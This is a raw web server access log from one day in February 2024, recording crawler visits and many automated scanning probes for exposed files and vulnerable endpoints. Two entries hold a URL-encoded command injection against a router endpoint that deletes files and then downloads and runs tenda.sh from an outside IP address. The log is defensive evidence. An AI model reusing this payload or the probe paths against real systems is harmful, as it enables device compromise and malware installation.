167.94.146.55 - - [23/Feb/2024:10:22:41 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
31.220.3.140 - - [23/Feb/2024:10:34:07 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
185.180.143.71 - - [23/Feb/2024:10:40:55 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.71 - - [23/Feb/2024:10:40:55 +0000] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
143.110.222.166 - - [23/Feb/2024:11:04:04 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
165.154.202.146 - - [23/Feb/2024:11:22:43 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
106.75.167.101 - - [23/Feb/2024:11:27:39 +0000] "GET / HTTP/1.1" 200 2826 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.167.101 - - [23/Feb/2024:11:27:40 +0000] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
104.237.128.194 - - [23/Feb/2024:12:07:57 +0000] "GET /b9iX HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.237.128.194 - - [23/Feb/2024:12:07:57 +0000] "GET /It7i HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
167.248.133.122 - - [23/Feb/2024:12:10:43 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
167.248.133.122 - - [23/Feb/2024:12:10:46 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.122 - - [23/Feb/2024:12:10:46 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
143.110.222.166 - - [23/Feb/2024:12:14:36 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
95.214.235.169 - - [23/Feb/2024:12:16:14 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [23/Feb/2024:12:16:17 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [23/Feb/2024:12:40:58 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [23/Feb/2024:12:40:58 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.190.156.234 - - [23/Feb/2024:12:41:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 159 "http://147.182.168.239:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
213.6.13.197 - - [23/Feb/2024:13:12:40 +0000] "GET / HTTP/1.1" 200 2826 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [23/Feb/2024:13:13:04 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
198.74.56.46 - - [23/Feb/2024:13:28:30 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.13 - - [23/Feb/2024:13:28:42 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.180.143.79 - - [23/Feb/2024:13:35:06 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
198.74.56.46 - - [23/Feb/2024:13:42:07 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.179 - - [23/Feb/2024:13:42:24 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.163.53 - - [23/Feb/2024:14:18:01 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.251 - - [23/Feb/2024:14:18:09 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [23/Feb/2024:14:21:52 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.200 - - [23/Feb/2024:14:53:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F107.175.3.74%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
185.224.128.200 - - [23/Feb/2024:14:53:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F107.175.3.74%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
95.214.235.169 - - [23/Feb/2024:15:04:01 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [23/Feb/2024:15:04:04 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [23/Feb/2024:15:15:24 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
186.156.119.154 - - [23/Feb/2024:15:31:06 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:31:06 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:31:06 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:31:07 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
83.97.73.245 - - [23/Feb/2024:15:32:05 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:35:05 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:35:05 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
83.97.73.245 - - [23/Feb/2024:15:36:57 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
118.193.73.8 - - [23/Feb/2024:15:37:25 +0000] "GET / HTTP/1.1" 200 2826 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
118.193.73.8 - - [23/Feb/2024:15:37:44 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.193.73.8 - - [23/Feb/2024:15:37:45 +0000] "GET /robots.txt HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.193.73.8 - - [23/Feb/2024:15:37:47 +0000] "GET /sitemap.xml HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
83.97.73.245 - - [23/Feb/2024:15:42:09 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:46:55 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:46:55 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:46:55 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:46:55 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:47:32 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:47:32 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:47:32 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:47:33 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:47:36 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:47:36 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
83.97.73.245 - - [23/Feb/2024:15:49:22 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:49:44 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:15:49:44 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:15:49:44 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:15:49:44 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:15:49:50 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:15:49:50 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
83.97.73.245 - - [23/Feb/2024:15:53:23 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:59:11 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:59:11 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:59:11 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:15:59:11 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
83.97.73.245 - - [23/Feb/2024:15:59:56 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
52.167.144.54 - - [23/Feb/2024:16:02:51 +0000] "GET /robots.txt HTTP/1.1" 404 159 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
157.55.39.205 - - [23/Feb/2024:16:03:01 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:16:03:05 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:16:03:05 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:16:03:06 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:16:03:06 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
40.77.188.159 - - [23/Feb/2024:16:03:49 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/112.0.0.0 Safari/537.36"
40.77.188.159 - - [23/Feb/2024:16:03:49 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/112.0.0.0 Safari/537.36"
192.155.88.231 - - [23/Feb/2024:16:08:43 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.34 - - [23/Feb/2024:16:08:49 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
83.97.73.245 - - [23/Feb/2024:16:14:28 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
104.131.144.32 - - [23/Feb/2024:16:22:27 +0000] "GET /portal/redlion HTTP/1.1" 404 159 "-" "Mozilla/5.0 zgrab/0.x"
31.220.88.155 - - [23/Feb/2024:16:34:20 +0000] "GET /admin/config.php HTTP/1.0" 302 0 "-" "xfa1"
186.156.119.154 - - [23/Feb/2024:16:43:54 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:16:43:55 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:16:43:55 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:16:43:55 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:16:44:20 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:16:44:20 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:16:45:30 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:16:45:30 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:16:45:30 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:16:45:31 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
83.97.73.245 - - [23/Feb/2024:16:52:53 +0000] "GET /console/ HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
149.50.105.76 - - [23/Feb/2024:16:56:08 +0000] "GET /.env HTTP/1.1" 404 179 "-" "-"
83.97.73.245 - - [23/Feb/2024:16:58:32 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.92.242.220 - - [23/Feb/2024:17:01:09 +0000] "GET /.env HTTP/1.1" 404 159 "-" "python-requests/2.26.0"
91.92.242.220 - - [23/Feb/2024:17:01:09 +0000] "POST / HTTP/1.1" 403 823 "-" "python-requests/2.26.0"
186.156.119.154 - - [23/Feb/2024:17:02:09 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:02:09 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:02:09 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:02:10 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:08:04 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:08:05 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:08:05 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:08:05 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:08:07 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:08:07 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:08:07 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
